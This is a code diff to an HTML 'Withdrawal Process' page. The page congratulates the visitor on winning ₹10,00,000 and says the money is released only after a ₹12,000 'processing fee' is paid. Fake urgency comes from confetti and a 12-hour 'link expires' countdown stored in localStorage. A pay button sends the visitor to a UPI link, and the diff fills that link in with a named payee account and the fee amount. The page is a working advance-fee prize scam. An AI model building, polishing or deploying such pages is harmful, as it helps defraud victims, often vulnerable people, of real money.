@@ -2,24 +2,27 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Withdrawal Process</title>
   <style>
+    * {
+      box-sizing: border-box;
+    }
+
     body {
       margin: 0;
       padding: 0;
       font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
       background-color: #f1f1f1;
-      overflow: hidden;
+      overflow-x: hidden;
     }
 
     .container {
-      height: 100vh;
-      width: 100vw;
+      min-height: 100vh;
       padding: 20px;
       display: flex;
       justify-content: center;
-      align-items: flex-start;
+      align-items: center;
     }
 
     .card {
@@ -29,72 +32,67 @@
       padding: 24px 20px;
       border-radius: 18px;
       box-shadow: 0 8px 24px rgba(0,0,0,0.15);
-      margin-top: 40px;
       position: relative;
       z-index: 1;
+      text-align: center;
     }
 
     .card h1 {
-      font-size: 24px;
+      font-size: 22px;
       margin-bottom: 10px;
-      text-align: center;
     }
 
-    .card .amount {
-      font-size: 28px;
+    .amount {
+      font-size: 26px;
       color: green;
       font-weight: bold;
-      text-align: center;
       margin-bottom: 18px;
     }
 
     .card p {
       font-size: 16px;
-      text-align: center;
       color: #444;
     }
 
-    .card .red {
+    .red {
       color: red;
       font-weight: bold;
       margin-top: 10px;
     }
 
-    .card button {
-      margin-top: 22px;
+    button {
+      margin-top: 20px;
       width: 100%;
       background-color: #05a505;
       color: white;
       border: none;
       border-radius: 10px;
       padding: 14px;
-      font-size: 17px;
+      font-size: 16px;
       font-weight: 500;
       cursor: pointer;
       transition: background-color 0.3s ease;
     }
 
-    .card button:hover {
+    button:hover {
       background-color: #038803;
     }
 
-    .card button:disabled {
+    button:disabled {
       background-color: grey;
       cursor: not-allowed;
     }
 
-    .card .note {
+    .note {
       font-size: 13px;
-      text-align: center;
-      margin-top: 14px;
       color: #888;
+      margin-top: 14px;
     }
 
-    .card .timer {
-      text-align: center;
+    .timer {
       font-size: 14px;
       color: #555;
-      margin-top: 10px;
+      margin-top: 12px;
     }
 
     canvas {
@@ -106,6 +104,25 @@
       z-index: 0;
       pointer-events: none;
     }
+
+    @media (max-width: 480px) {
+      .card {
+        padding: 20px 16px;
+      }
+
+      .card h1 {
+        font-size: 20px;
+      }
+
+      .amount {
+        font-size: 24px;
+      }
+
+      button {
+        font-size: 15px;
+        padding: 12px;
+      }
+    }
   </style>
 </head>
 <body>
@@ -113,7 +130,7 @@
   <div class="container">
     <div class="card">
       <h1>CONGRATULATIONS</h1>
-      <div class="amount">₹1,00,00,00</div>
+      <div class="amount">₹10,00,000</div>
       <p>To complete your withdrawal, you need to pay a processing fee of ₹12,000.</p>
       <p class="red">Your withdrawal will be processed only after successful payment.</p>
       <div class="timer" id="countdown">Link expires in: 12:00:00</div>
@@ -125,45 +142,29 @@
   <!-- Confetti JS -->
   <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.5.1/dist/confetti.browser.min.js"></script>
   <script>
-    // Confetti
     const canvas = document.getElementById('confetti-canvas');
     const myConfetti = confetti.create(canvas, {
       resize: true,
       useWorker: true
     });
 
-    const duration = 3 * 1000;
+    const duration = 3000;
     const end = Date.now() + duration;
 
     (function frame() {
-      myConfetti({
-        particleCount: 5,
-        angle: 60,
-        spread: 55,
-        origin: { x: 0 }
-      });
-      myConfetti({
-        particleCount: 5,
-        angle: 120,
-        spread: 55,
-        origin: { x: 1 }
-      });
-
-      if (Date.now() < end) {
-        requestAnimationFrame(frame);
-      }
+      myConfetti({ particleCount: 5, angle: 60, spread: 55, origin: { x: 0 } });
+      myConfetti({ particleCount: 5, angle: 120, spread: 55, origin: { x: 1 } });
+      if (Date.now() < end) requestAnimationFrame(frame);
     })();
 
-    // Timer with localStorage (12 hours)
     const countdownElement = document.getElementById("countdown");
     const payButton = document.getElementById("payButton");
-
     const EXPIRY_KEY = "withdrawal_expiry_time";
 
     function getOrCreateExpiryTime() {
       let expiry = localStorage.getItem(EXPIRY_KEY);
       if (!expiry) {
-        expiry = Date.now() + 12 * 60 * 60 * 1000; // 12 hours
+        expiry = Date.now() + 12 * 60 * 60 * 1000;
         localStorage.setItem(EXPIRY_KEY, expiry);
       }
       return parseInt(expiry, 10);
@@ -190,9 +191,8 @@
       countdownElement.innerText = `Link expires in: ${String(hours).padStart(2, '0')}:${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
     }, 1000);
 
-    // UPI Redirection
     function redirectToUPI() {
-      const upiLink = "upi://pay?pa=&pn=Withdrawal%20Processing&am=15000&cu=INR";
+      const upiLink = "upi://pay?pa=paymentmanager8256@okicici&pn=Withdrawal%20Processing&am=12000&cu=INR";
       window.location.href = upiLink;
     }
   </script>
